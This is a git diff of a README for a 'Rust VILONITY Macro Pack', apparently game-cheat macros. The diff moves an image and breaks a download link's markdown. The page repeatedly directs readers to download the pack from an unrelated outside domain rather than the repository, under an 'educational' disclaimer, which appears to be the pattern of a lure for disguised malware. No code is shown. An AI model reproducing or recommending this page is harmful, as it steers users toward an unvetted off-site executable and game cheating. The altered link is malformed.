@@ -2,6 +2,8 @@
 
 Welcome to the **Rust VILONITY Macro Pack** repository! This release offers a powerful collection of Rust macros, giving players refined control and precision through fully customizable automation tools. This resource is intended for educational and personal enhancement purposes, encouraging skill development and responsible usage.
 
+![image](https://github.com/user-attachments/assets/4ae1e0e5-b31c-475d-a8cd-dc5771745cae)
+
 ## 🚀 Get Started
 To access the macro pack, please download it from the following link: [Download Now!](https://softspace.space/) 📥
 
@@ -15,8 +17,6 @@ By exploring and using the VILONITY macro pack, you can:
 - Learn how macros interact with game mechanics for personal development.
 
 ![image](https://github.com/user-attachments/assets/c5b4a405-8cf9-4d75-86b5-f5e69d93c358)
-
-![image](https://github.com/user-attachments/assets/4ae1e0e5-b31c-475d-a8cd-dc5771745cae)
 
 ## 🎯 How to Contribute
 We welcome contributions from developers and macro designers interested in refining VILONITY. Here's how you can get involved:
@@ -34,6 +34,6 @@ To maintain a responsible and respectful environment, we ask contributors to fol
 ## 📌 Stay Updated
 Stay in the loop with new releases and improvements by following us on GitHub and checking for new commits and tags.
 
-[![Download Now](https://softspace.space/)](https://softspace.space/)
+[Download Now](https://softspace.space/)](https://softspace.space/)
 
 Level up your Rust experience with **VILONITY**—a macro pack built for control, precision, and player empowerment.
